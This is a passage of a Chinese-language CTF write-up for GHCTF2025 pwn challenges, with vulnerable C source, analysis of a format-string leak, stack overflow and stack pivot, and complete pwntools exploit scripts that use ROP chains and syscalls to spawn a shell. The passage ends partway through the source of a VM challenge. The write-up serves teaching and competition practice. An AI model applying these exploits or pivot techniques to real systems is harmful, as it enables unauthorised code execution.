class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gitf</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">0x10</span>]=<span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">        <span class="type">char</span> str1[<span class="number">0x20</span>];</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;give you a gift.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;show your magic\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,str1,<span class="number">0x60</span>);</span><br><span class="line">        __asm__(<span class="string">&quot;lea -0x30(%rbp),%rax;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        func();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2libc2_分析1"><a class="markdownIt-Anchor" href="#ret2libc2_分析1"></a> ret2libc2_分析1</h2><ul><li>我们来<code>check</code>一下这个附件，发现并没有开启<code>PIE</code>保护也没有开启<code>Canary</code>保护</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222120594.png" alt="image-20250309222120594"></p><ul><li>接下来使用<code>IDA pro</code>对附件进行反编译，查看一下代码，先来查看一下<code>main</code>函数，<code>main</code>函数会调用<code>init</code>函数对输入输出进行初始化</li><li>然后就调用<code>func</code>函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222442715.png" alt="image-20250309222442715"></p><ul><li>接下来我们就来分析<code>func()</code>函数<ul><li>这个函数首先会输出<code>hello world!</code>，注意这里存在一个格式化字符的漏洞</li><li>但是在<code>printf</code>输出<code>format</code>的内容之前，并没有<code>read</code>，并不能修改<code>format</code>的内容</li><li>我们先接下去看，这时我们看到这边存在一个栈溢出，并且<strong>很重要的一点</strong>就是我们我们read写入<code>buf</code>的地址比<code>format</code>的地址更低</li><li>所以我们在溢出<code>buf</code>的时候，我们同时也可以改写<code>format</code>的内容</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222559379.png" alt="image-20250309222559379"></p><ul><li>接下来我们查看一下这个函数的汇编形式，我们可以注意到，在调用<code>read</code>函数后有一个<code>lea rax,[rbp+buf]</code>这个地址。这时我们溢出的时候就可以对这个<code>rax</code>进行一些利用</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223051762.png" alt="image-20250309223051762"></p><ul><li>这时我们再查看这个程序的<code>rop</code>链，发现这个程序并没有我们想要的<code>gadget</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223347969.png" alt="image-20250309223347969"></p><ul><li>所以我们就只能找别的方式利用栈溢出漏洞和字符串格式化漏洞。由于没有开启<code>PIE</code>，我们就可以先将这个程序返回到<code>mov rdi,rax</code>这个指令，我们就可以再次使用<code>printf</code>函数输出<code>format</code>的内容，而这次输出的<code>format</code>内容我们就不会输出<code>hello world!</code>。而是我们<code>read()</code>，溢出的一部分内容。</li><li>所以我们使用<code>read</code>在<code>format</code>这个地址中读入<code>%n$p</code>，这样我们就可以泄露指定地址</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223455358.png" alt="image-20250309223455358"></p><h2 id="ret2libc2_分析2"><a class="markdownIt-Anchor" href="#ret2libc2_分析2"></a> ret2libc2_分析2</h2><ul><li>接下来我们就可以动态调试查看一下调用<code>printf</code>时，确定偏移量，泄露栈上的libc地址。</li><li>这边可以泄露<code>__libc_start_call_main+128</code>的地址，这时我们可以确定偏移地址<code>0x7+0x9-1=0xF</code>（这个是错误的）<strong>注意并不能通过现在rsp指针指向的位置算出偏移，我们因为我们是修改返回地址，再调用<code>printf</code>函数泄露地址，但是在我们<code>ret</code>之前，我们执行了<code>leave</code>这个汇编代码，改变了<code>rsp</code>的值，所以我们真正确定偏移的时候应该是在执行<code>leave</code>语句后再确定偏移</strong></li><li>但是这个地址需要我们反编译<code>libc.so</code>文件，所以我在泄露的时候并不是泄露这个地址</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309224059341.png" alt="image-20250309224059341"></p><ul><li>我们接下去查看，会发现这边还可以泄露另一个<code>libc</code>的地址，即<code>__libc_start_main+128</code>，我们选用这个地址，这样可以使用<code>pwntools</code>自带的一些函数快速寻找到偏移</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309224319279.png" alt="image-20250309224319279"></p><ul><li>现在我们来真正确定偏移，我们才能计算出真正的偏移<ul><li><code>__libc_start_call_main+128</code>：<code>0x2+0x6-0x1=0x7</code></li><li><code>__libc_start_main+128</code>：<code>0x16+0x6-0x1=0x1B</code></li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309225237277.png" alt="image-20250309225237277"></p><ul><li>这边我们泄露了地址后，我们就可以对地址接收，然后得到<code>libc</code>的地址。</li><li><strong>这里还需要注意一点</strong>在第一次进行栈溢出操作的时候需要进行栈迁移操作，否则第二次程序在执行<code>ret</code>之前又会执行一次，<code>leave</code>操作</li><li>如果我们在栈溢出时随便填写<code>rbp</code>指向地址里面的内容就会出现一个问题，第一次<code>leave</code>后<code>rbp</code>跑到了不存在的内存地址。第二次<code>leave</code>时就会出现段错误</li><li>在第二次溢出的时候，还会执行一次<code>leave</code>，这时的<code>rbp</code>指向的位置，也不能随便覆盖一个值，也需要覆盖一个可读可写的地址</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310004005221.png" alt="image-20250310004005221"></p><ul><li><p>为什么栈迁移这边有做详细分析<a href="https://iyheart.github.io/2024/06/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/%E5%85%B3%E4%BA%8EPWN%E4%B8%AD%E7%9A%84%E7%96%91%E9%97%AE/">关于PWN中的疑问 | iyheart的博客</a></p></li><li><p>这里在栈迁移的时候还需要注意几点：</p><ul><li>栈迁移时最好不要迁移到<code>.bss</code>段开头的位置，否则之后在执行<code>system(&quot;/bin/sh&quot;)</code>时会将栈地址降低，这时栈地址跑到了不能可读可写的段上去了。</li><li>我们在栈迁移的时候最好就是迁移到<code>.bss</code>段偏高一点的地方。</li></ul></li><li><p>泄露之后就是正常的<code>ret2libc</code>去打了，这里其实<code>system(&quot;/bin/sh&quot;)</code>也可以打的出来，栈迁移时，迁移到的<code>.bss</code>段地址再高一点就不会报错</p></li><li><p>而我这边使用<code>onegadget</code>进行打，首先我们需要使用到<code>one_gadget</code>这个插件，之后我们使用如下命令，这时我们的窗口就会输出<code>onegadget</code>，我们来具体介绍一下这些东西</p></li><li><p>当我们泄露libc地址后计算出<code>ogg</code>的偏移，跳转执行<code>ogg</code>,如果我们的寄存器满足这些条件，那么我们就可以<code>getshell</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc.so.6</span><br></pre></td></tr></table></figure><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310005115495.png" alt="image-20250310005115495"></p><ul><li>这里我选用的是倒数第二个，这时我们还要构造一个<code>rop</code>链，将<code>rax</code>设置为<code>0</code>，由于我们前面栈迁移（第二次栈迁移）会将<code>rbp</code>指针保持在可读可写的<code>bss</code>段中，所以<code>rbp-0x48</code>可写是没问题的。</li><li>当我们<code>rbp</code>处于bss段地址比较高的地方，<code>rbp-0x70</code>这个地址保存的值一般都是<code>0</code>，所以<code>[rbp-0x70]=NULL</code>也满足。</li><li>然后我们再使用<code>pop rax</code>将<code>rax</code>设置为<code>0</code>就没问题了</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310005307327.png" alt="image-20250310005307327"></p><h2 id="ret2libc2_exp"><a class="markdownIt-Anchor" href="#ret2libc2_exp"></a> ret2libc2_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28323</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc2&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x404508</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2b</span>+<span class="string">b&#x27;%27$p&#x27;</span>+ p64(bss_addr+<span class="number">0x400</span>)+p64(<span class="number">0x401227</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">libc_start = p.recvline()[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak--&gt;&quot;</span>,libc_start)</span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">16</span>)</span><br><span class="line">libc_addr = libc_start - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">128</span>))</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x904a9</span></span><br><span class="line">pop_rax = libc_addr + <span class="number">0x45eb0</span></span><br><span class="line">ogg = libc_addr + <span class="number">0xebd43</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+ p64(bss_addr+<span class="number">0x500</span>) <span class="comment">#+ p64(pop_rax)+p64(0)+p64(ogg)</span></span><br><span class="line">payload+= p64(pop_rdi)+ p64(sh_addr)+ p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="你真会布栈吗"><a class="markdownIt-Anchor" href="#你真会布栈吗"></a> 你真会布栈吗？</h1><ul><li>考点：<code>syscall</code>、<code>布置rop链</code></li><li>这题的打的思路比较多，所以这边就多给几个exp</li><li>还有一件事，这题是塞的国际赛题，所以没源码</li></ul><h2 id="你真会布栈吗_分析"><a class="markdownIt-Anchor" href="#你真会布栈吗_分析"></a> 你真会布栈吗？_分析</h2><ul><li>按照流程，先<code>check</code>一下，发现这个程序的保护机制全部没开。</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310010543822.png" alt="image-20250310010543822"></p><ul><li>这里我们来分析一下这个程序的运行逻辑，我们发现这个程序只有<code>_start函数</code>和<code>print</code>函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011019651.png" alt="image-20250310011019651"></p><ul><li>我们一开始运行程序的时候会先运行<code>_start</code>这个函数，这个函数就相当于<code>main</code>函数，然后我们具体查看一下<code>_start</code>这个函数<ul><li>这个函数执行的逻辑其实就是，进行三次输出</li><li>然后将用户可以输入内容到栈上，可以写入<code>0x60</code>字节到栈上</li><li>之后会返回到<code>rsp</code>指向的地址处</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011431918.png" alt="image-20250310011431918"></p><ul><li>这时我们再来查看一下<code>print</code>函数<ul><li>除了实现主要的输出功能外</li><li>我们还发现存在<code>xchg rax,r13</code>，这个指令就是交换<code>rax</code>和<code>r13</code>这两个寄存器的值</li><li>最后就是返回</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011646315.png" alt="image-20250310011646315"></p><ul><li>接下来我们查看一下其他的<code>.text</code>段会发现有给<code>gadgets</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310015206503.png" alt="image-20250310015206503"></p><ul><li>接下来我们运行一下这个程序，发现这个程序在这边会输出乱码，接下来我们动调和接收一下</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011924906.png" alt="image-20250310011924906"></p><h2 id="你真会布栈吗思路1_利用xchg-raxr13和栈地址"><a class="markdownIt-Anchor" href="#你真会布栈吗思路1_利用xchg-raxr13和栈地址"></a> 你真会布栈吗？思路1_利用xchg rax,r13和栈地址</h2><ul><li>如果知道栈上的地址，我们就可以直接写<code>/bin/sh</code>到栈上，然后计算好偏移即可。这时我们可以直接<code>syscall 59</code>。</li><li>所以我们就直接调用<code>gadget</code>进行布置栈，布置到这里<code>gadget</code>就算是利用完成了，这里我们还要注意，jmp到<code>gadgets</code>后<code>rsp</code>这个栈帧并没有增加，所以我们将程序<code>jmp</code>到<code>gadgets</code>的<code>pop_r15</code>这边，这样就可以让<code>rsp</code>指针先增大<code>0x8</code>，接下来才开始真正的布置栈</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083114532.png" alt="image-20250310083114532"></p><ul><li>接下来我们看执行完<code>xchg</code>后会执行什么，发现执行<code>xchg</code>后会执行，<code>jmp [rsp]</code>，这时我们还可以继续布置栈</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310080228337.png" alt="image-20250310080228337"></p><ul><li>这时我们的寄存器已经是满足了，现在我们就来满足<code>rdi</code>的值为<code>/bin/sh</code>这个字符串的地址，由于我们的栈地址已知。我们这个时候就能将<code>/bin/sh</code>写入到栈上，这时我们就可以这样布置栈</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083141646.png" alt="image-20250310083141646"></p><ul><li>这时我们可以计算偏移得到<code>/bin/sh</code>这个字符串的地址与我们接收到栈地址的偏移。接下来我们查看是否能打出来，这边发现已经能执行<code>execve</code>了，但是我们注意到<code>envp</code>这边还有点问题，导致我们<code>execve</code>无法正常调用</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081102077.png" alt="image-20250310081102077"></p><ul><li>所以就会出现系统调用失败</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081249245.png" alt="image-20250310081249245"></p><ul><li>这时我们就要利用<code>gadgets</code>对<code>rdx</code>这个寄存器清零操作</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081354593.png" alt="image-20250310081354593"></p><ul><li><p>这时我们发现这个程序在异或完还会<code>jmp r15</code>，所以我们是不是能先将<code>r15</code>的值赋值成<code>syscall_addr</code>（第一次调用syscall那个地址主要的目的是指向交换两个寄存器的值，此时由于syscall传递的参数不符合，syscall会调用失败。）并且之后执行完xchg后我们就跳转到<code>xor rdx,rdx</code>，这时我们发现<code>r15</code>还指向<code>syscall</code>的地址</p></li><li><p>所以修改一下布置的栈，修改后栈布置如下：</p></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083318778.png" alt="image-20250310083318778"></p><ul><li>动调算到的偏移，为程序泄露出来的栈地址<code>leak_addr+0x28</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x401017</span></span><br><span class="line">syscall = <span class="number">0x40100A</span></span><br><span class="line">xchg = <span class="number">0x40100C</span></span><br><span class="line">pop_r15=<span class="number">0x40101C</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;    (&quot; ~----( ~   Y.  )\n&#x27;</span>)</span><br><span class="line">a = p.recvline()[:<span class="number">6</span>]</span><br><span class="line">a = <span class="built_in">int</span>.from_bytes(a,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---&gt;&quot;</span>,<span class="built_in">hex</span>(a))</span><br><span class="line">payload = p64(pop_r15)+p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(a+<span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">payload += p64(<span class="number">0x401021</span>)+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="你真会布栈吗思路2_只利用xchg-raxr13"><a class="markdownIt-Anchor" href="#你真会布栈吗思路2_只利用xchg-raxr13"></a> 你真会布栈吗？思路2_只利用xchg rax,r13</h2><ul><li>这个就是单纯的布置栈了。这个我就不写了（写得好累）</li><li>直接贴exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28015)</span></span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">pop_r13_r15 = <span class="number">0x401019</span></span><br><span class="line">print_addr = <span class="number">0x401000</span></span><br><span class="line">a = p64(pop_r13_r15) + p64(<span class="number">0x0</span>) + p64(print_addr) + p64(<span class="number">0x40101c</span>) + p64(<span class="number">0x401017</span>)</span><br><span class="line">a += p64(<span class="number">0x402000</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">a += p64(<span class="number">0x0</span>) + p64(<span class="number">0x40100A</span>) + p64(<span class="number">0x40101c</span>) +p64(<span class="number">0x401017</span>)</span><br><span class="line">a += p64(<span class="number">0x0</span>) + p64(<span class="number">0x402000</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">59</span>) + p64(<span class="number">0x40100A</span>) + p64(<span class="number">0x401021</span>)</span><br><span class="line"><span class="comment">#a += p64(0x40100A)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,a)</span><br><span class="line">b = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#p.send(b&#x27; &#x27;)</span></span><br><span class="line">p.interactive()                          </span><br></pre></td></tr></table></figure><h1 id="my_vm"><a class="markdownIt-Anchor" href="#my_vm"></a> my_vm</h1><ul><li><p>主要考点就是：<code>vm_pwn</code>、<code>固定指令设计</code>、<code>越界读写</code></p></li><li><p>这题就是<code>[OGeek2019 Final]OVM</code>这题改编的，已经改编的比较有好了。原题在动调的时候会比较麻烦，并且越界读写计算偏移比较麻烦。</p></li><li><p>修改的源码如下，现在就放出我修改的源码：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> memory[<span class="number">65536</span>];</span><br><span class="line"><span class="type">int</span> reg[<span class="number">12</span>];</span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">void</span> (*funcptr)();</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">fetch</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;over!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span 